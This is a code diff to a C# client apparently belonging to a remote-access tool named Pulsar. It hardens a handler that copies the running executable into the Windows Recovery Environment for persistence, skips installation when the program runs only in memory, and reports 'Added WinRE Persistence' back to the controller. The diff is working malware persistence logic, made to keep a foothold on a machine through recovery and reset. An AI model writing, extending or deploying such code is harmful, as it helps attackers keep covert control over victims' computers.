@@ -3,6 +3,7 @@ using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.ClientManagement.WinRE;
 using Pulsar.Common.Messages.Other;
 using Pulsar.Common.Networking;
+using System;
 using System.Diagnostics;
 using System.Reflection;
 
@@ -31,16 +32,28 @@ namespace Pulsar.Client.Messages
         {
             // check to see if the file is currently being ran in memory or on disk.
             // if its in memory then just return
-            string exeLocation = Assembly.GetExecutingAssembly().Location;
+            string exeLocation;
 
-            if (string.IsNullOrEmpty(exeLocation))
+            try
             {
-                // we running in memory
+                exeLocation = Assembly.GetExecutingAssembly().Location;
+
+                if (string.IsNullOrEmpty(exeLocation))
+                {
+                    // we running in memory
+                    return;
+                }
+            } catch (Exception ex)
+            {
+                // ye we def in memory
+                Debug.WriteLine($"Failed to get assembly location: {ex.Message}");
                 return;
             }
 
             byte[] bytes = System.IO.File.ReadAllBytes(exeLocation);
+            WinREPersistence.Uninstall();
             WinREPersistence.InstallFile(bytes, ".exe");
+
             client.Send(new SetStatus
             {
                 Message = "Added WinRE Persistence"
